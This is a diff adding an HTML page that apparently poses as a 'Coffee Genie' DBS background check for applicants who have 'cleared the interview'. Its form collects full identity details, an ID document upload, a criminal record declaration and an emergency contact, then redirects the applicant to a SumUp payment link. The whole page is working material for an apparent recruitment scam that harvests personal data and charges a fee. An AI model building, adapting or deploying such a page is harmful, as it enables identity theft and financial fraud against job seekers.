@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations! Complete Your DBS Check - Coffee Genie</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(to right, #1f2937, #374151);
+            color: #f1f5f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            margin: 0;
+        }
+        .form-container {
+            background: #1e293b;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            max-width: 700px;
+            width: 100%;
+            animation: fadeIn 0.8s ease-in-out;
+        }
+        h1 {
+            text-align: center;
+            color: #38bdf8;
+            margin-bottom: 20px;
+        }
+        p.instructions {
+            text-align: center;
+            color: #fbbf24;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        label {
+            font-weight: 600;
+            color: #cbd5e1;
+            margin-bottom: 5px;
+            display: block;
+        }
+        input, textarea, select {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 8px;
+            border: none;
+            background: #334155;
+            color: #f1f5f9;
+        }
+        input:focus, textarea:focus, select:focus {
+            border: 2px solid #38bdf8;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            color: #ffffff;
+            background: linear-gradient(to right, #0ea5e9, #2563eb);
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background: linear-gradient(to right, #2563eb, #1e40af);
+        }
+        .section-heading {
+            font-size: 1.2rem;
+            color: #fbbf24;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h1>Congratulations on Clearing the Interview!</h1>
+        <p class="instructions">
+            Please complete your DBS check to finalize your application.  
+            Once completed, your rota instructions will be sent shortly.
+        </p>
+        <form id="dbsForm">
+
+            <div class="section-heading">Personal Information</div>
+            <label for="fullName">Full Name</label>
+            <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
+
+            <label for="dob">Date of Birth</label>
+            <input type="date" id="dob" name="dob" required>
+
+            <label for="nationality">Nationality</label>
+            <input type="text" id="nationality" name="nationality" placeholder="Enter your nationality" required>
+
+            <label for="address">Current Address</label>
+            <textarea id="address" name="address" rows="3" placeholder="Enter your full address" required></textarea>
+
+            <label for="phone">Phone Number</label>
+            <input type="text" id="phone" name="phone" placeholder="Enter your phone number" required>
+
+            <label for="email">Email Address</label>
+            <input type="email" id="email" name="email" placeholder="Enter your email address" required>
+
+            <div class="section-heading">ID Verification</div>
+            <label for="idDocument">Upload ID Document (Passport, Driving License, etc.)</label>
+            <input type="file" id="idDocument" name="idDocument" required>
+
+            <div class="section-heading">Criminal Record Declaration</div>
+            <label for="criminalRecord">Have you ever been convicted of a criminal offense?</label>
+            <select id="criminalRecord" name="criminalRecord" required>
+                <option value="" disabled selected>Select an option</option>
+                <option value="No">No</option>
+                <option value="Yes">Yes</option>
+            </select>
+
+            <label for="recordDetails" style="display: none;" id="recordDetailsLabel">If yes, please provide details:</label>
+            <textarea id="recordDetails" name="recordDetails" style="display: none;" rows="4" placeholder="Provide details of the offense"></textarea>
+
+            <div class="section-heading">Emergency Contact</div>
+            <label for="emergencyContactName">Emergency Contact Name</label>
+            <input type="text" id="emergencyContactName" name="emergencyContactName" placeholder="Enter contact name" required>
+
+            <label for="emergencyContactPhone">Emergency Contact Phone</label>
+            <input type="text" id="emergencyContactPhone" name="emergencyContactPhone" placeholder="Enter contact phone number" required>
+
+            <button type="submit">Submit DBS Form</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('criminalRecord').addEventListener('change', function() {
+            const recordDetails = document.getElementById('recordDetails');
+            const recordDetailsLabel = document.getElementById('recordDetailsLabel');
+            if (this.value === 'Yes') {
+                recordDetails.style.display = 'block';
+                recordDetailsLabel.style.display = 'block';
+            } else {
+                recordDetails.style.display = 'none';
+                recordDetailsLabel.style.display = 'none';
+            }
+        });
+
+        document.getElementById('dbsForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const formData = new FormData(event.target);
+            const data = Object.fromEntries(formData.entries());
+
+            try {
+                const response = await fetch('/submit-dbs-form', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
+                });
+
+                if (response.ok) {
+                    window.location.href = 'https://pay.sumup.com/b2c/QN5F17K1';  // Redirect to payment link
+                } else {
+                    alert('Error submitting DBS form.');
+                }
+            } catch (error) {
+                alert('Error submitting DBS form.');
+            }
+        });
+    </script>
+</body>
+</html>
+
